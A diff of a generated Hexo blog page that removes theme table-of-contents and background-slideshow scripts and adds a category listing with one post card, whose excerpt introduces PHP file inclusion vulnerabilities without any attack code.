-</style>
-    
-  </div>
-
-<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
-
-
-  </div>
-
-  <!-- 目录 -->
-  <!-- 文章详情页右侧目录 -->
-
-  <div class="toc-aside">
-    <div class="toc-main">
-      <div class="toc-aside-title">
-        <i class="fas fa-list-ul" aria-hidden="true"></i><span>本文目录</span>
-        
-          <div class="toc-open-close">本文目录</div>
-        
-      </div>
-      <div class="toc-content">
-        <div class="toc"></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- 手机端目录按钮 -->
-  <div id="toc-mobile-btn">
-    <i class="fas fa-list-ul" aria-hidden="true"></i>
-  </div>
-  <!-- js在scripts目录下的的toc.ejs里面 -->
-  
-
-  <script>
-    function openBtnClickFn () {
-      let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
-      let open = eval('' || 'true');
-      openOrCloseBtn.click(function() {
-        if (open === true) {
-          $(".toc-aside").css({'width': 0, 'padding': 0});
-          $(".toc-content").css({'width': 0});
-          $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
-          $(".main-content").css({'width': '75%', 'margin': '10px auto'});
-          open = false;
-        } else {
-          $(".toc-aside").css({'width': '300px', 'padding': '0 10px'});
-          $(".toc-content").css({'width': '300px'});
-          $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
-          $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
-          open = true;
-        }
-      });
-    };
-    openBtnClickFn();
-    document.addEventListener('pjax:complete', function () {
-      openBtnClickFn();
-    })
-    
-  </script>
-
-
-  <!-- 图片放大 Wrap images with fancybox support -->
-  <script src="/js/wrapImage.js"></script>
-</div>
-
-<!-- 文章详情页背景图 -->
-<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
-	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
-	<transition-group tag="ul" :name="names">
-		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
-			<img :src="image" class="bg-swiper-img no-lazy">
-		</li>
-	</transition-group>
-</div>
-<script>
-	var vm = new Vue({
-		el: '#appBgSwiper',
-		data: {
-			names: '' || 'fade' || 'fade', // translate-fade fade
-			mark: 0,
-			img: [],
-			bgColor: '',
-			time: null
-		},
-		methods: {   //添加方法
-			change(i, m) {
-				if (i > m) {
-					// this.names = 'fade';
-				} else if (i < m) {
-					// this.names = 'fade';
-				} else {
-					return;
-				}
-				this.mark = i;
-			},
-			prev() {
-				// this.names = 'fade';
-				this.mark--;
-				if (this.mark === -1) {
-					this.mark = 3;
-					return
-				}
-			},
-			next() {
-				// this.names = 'fade';
-				this.mark++;
-				if (this.mark === this.img.length) {
-					this.mark = 0;
-					return
-				}
-			},
-			autoPlay() {
-				// this.names = 'fade';
-				this.mark++;
-				if (this.mark === this.img.length) {
-					this.mark = 0;
-					return
-				}
-			},
-			play() {
-				let bgImgDelay = '' || '180000'
-				let delay = parseInt(bgImgDelay) || 180000;
-				this.time = setInterval(this.autoPlay, delay);
-			},
-			enter() {
-				clearInterval(this.time);
-			},
-			leave() {
-				this.play();
-			}
-		},
-		created() {
-			this.play()
-		},
-		beforeDestroy() {
-			clearInterval(this.time);
-		},
-		mounted() {
-			let prop = '' || '/medias/back.jpg';
-			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
-			if (isImg) {
-				let img = prop.split(',');
-				let configRoot = '/'
-				let arrImg = [];
-				img.forEach(el => {
-					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
-					var objExp = new RegExp(Expression);
-
-					if (objExp.test(el)) {
-						// http or https
-						arrImg.push(el);
-					} else {
-						// 非http or https开头
-						// 本地文件
-						let firstStr = el.charAt(0);
-						if (firstStr == '/') {
-							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
-						}
-						el = configRoot + el;
-						arrImg.push(el);
-					}
-				})
-				this.img = arrImg;
-			} else {
-				this.bgColor = prop;
-			}
-		}
-	})
+  typedFn();
 </script>
+    
+  </div>
+  <div class="mask-box"></div>
+</div>
 
-<style>
-	.bg-swiper-box {
-		position: absolute;
-		display: block;
-		width: 100%;
-		height: 100%;
-	}
 
-	.bg-swiper-img {
-		object-fit: cover;
-		width: 100%;
-		height: 100%;
-	}
-</style>
+
+<div class="tag">
+  <div class="tag-name">
+    <div class="name" style="background-color: #F5EEF8;">Web知识点 分类</div>
+  </div>
+  <!-- 每一篇文章卡片 -->
+  <!-- hash算法 -->
+
+<section class="posts">
+  
+    
+    <article class="post reveal" style="flex-direction: row-reverse;   ">
+      <div class="post-main">
+        <div class="post-info">
+          <div class="post-time">
+            <i class="fas fa-clock" aria-hidden="true"></i>
+            <span class="post-time">2021-09-28</span>
+          </div>
+          <div class="post-title">
+            <a class="post-title-link" href="/2021/09/28/Web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">Web基础漏洞</a>
+          </div>
+          <div class="post-meta">
+            <div class="post-tags">
+              <!-- 文章详情页的标签 -->
+
+    <i class="iconfont icontag"></i>
+    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">Web知识点</a></li></ul>
+
+            </div>
+            <div class="post-categories">
+              <!-- 文章详情页的分类 -->
+
+<div class="article-category">
+  <i class="iconfont iconbookmark1"></i>
+  <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+</div>
+
+
+            </div>
+          </div>
+          <div class="post-img-mobile">
+            <a href="/2021/09/28/Web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="background-size: cover; 
+              background-position: center center;">
+              <img class="lazyload lazyload placeholder" src="/medias/8.jpg" class="lazyload placeholder" data-srcset="/medias/8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+            </a>
+          </div>
+          <div class="post-content">
+            一、文件包含漏洞
+一、常见函数漏洞点
+
+include()、include_once()、require()、require_once()
+
+应用场景：
+
+具有相关文件包含函数
+
+存在动态变量 inlcude $file
+
+攻击者能够控制该
+          </div>
+        </div>
+        <div class="post-more">
+          <a href="/2021/09/28/Web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+            <i class="iconfont iconmore" pointer style="float: right;  " title="阅读更多"></i>
+          </a>
+        </div>
+      </div>
+      <div class="post-img">
+        <a href="/2021/09/28/Web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="background-size: cover; 
+          background-position: center center;">
+          <img class="lazyload lazyload placeholder" src="/medias/8.jpg" class="lazyload placeholder" data-srcset="/medias/8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+        </a>
+      </div>
+    </article>
+  
+</section>
+</div>
+
+
 
       </main>
     </div>
